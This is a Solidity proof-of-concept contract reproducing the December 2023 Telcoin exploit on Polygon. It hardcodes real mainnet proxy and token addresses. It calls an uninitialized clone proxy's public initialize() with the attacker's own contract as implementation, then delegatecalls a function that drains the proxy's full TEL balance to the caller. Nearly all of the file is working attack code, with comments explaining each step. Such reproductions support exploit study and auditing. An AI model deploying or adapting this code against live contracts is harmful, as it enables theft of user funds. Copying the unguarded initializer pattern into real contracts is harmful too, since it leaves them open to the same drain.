// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Telcoin exploit (Polygon, Dec 2023) — an EIP-1167 clone proxy
// ("CloneableProxy#1") was deployed but never initialized before the
// attacker got to it. Its `initialize(address,bytes)` function is public and
// callable by anyone exactly once: the caller picks BOTH the implementation
// the proxy adopts AND the calldata the proxy immediately delegatecalls into
// that implementation. Faithful, cheatcode-free port of the registry's
// Foundry PoC (test/Telcoin_exp.sol) — the diagnostic vm.load()/console.log()
// calls and the trailing vm.expectRevert() re-initialization sanity check are
// dropped since they only inspect state, they never gate or produce profit.

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface ICloneableProxy {
    function initialize(address _logic, bytes memory data) external;
}

contract ContractTest {
    // CloneableProxy#1: https://polygonscan.com/address/0x56bcadff30680ebb540a84d75c182a5dc61981c0
    ICloneableProxy private constant CloneableProxy = ICloneableProxy(0x56BCADff30680EBB540a84D75c182A5dC61981C0);
    // TEL (UChildERC20 proxy): https://polygonscan.com/address/0xdf7837de1f2fa4631d716cf2502f8b230f1dcc32
    IERC20 private constant TEL = IERC20(0xdF7837DE1F2Fa4631D716CF2502f8b230F1dcc32);

    function testExploit() public {
        // The proxy is still uninitialized, so its public initialize() will
        // accept ANY (_logic, data) pair. Hand it our own address as the new
        // implementation and our own transferTELFromCloneableProxy()
        // selector as the calldata to immediately delegatecall.
        bytes memory data = abi.encodePacked(this.transferTELFromCloneableProxy.selector);
        CloneableProxy.initialize(address(this), data);
    }

    // Queried by the proxy's initializer while it wires up the new
    // implementation/beacon.
    function implementation() external view returns (address) {
        return address(this);
    }

    // Delegatecalled FROM CloneableProxy#1 during initialize(). Because this
    // runs via delegatecall, `address(this)` inside the executing frame is
    // CloneableProxy#1 itself, so `TEL.balanceOf(address(CloneableProxy))`
    // reads the proxy's own hoard. `msg.sender` is preserved from the
    // original (non-delegatecall) call into initialize() — i.e. this attack
    // contract — so the transfer lands the entire drained balance right here.
    function transferTELFromCloneableProxy() external {
        TEL.transfer(msg.sender, TEL.balanceOf(address(CloneableProxy)));
    }
}
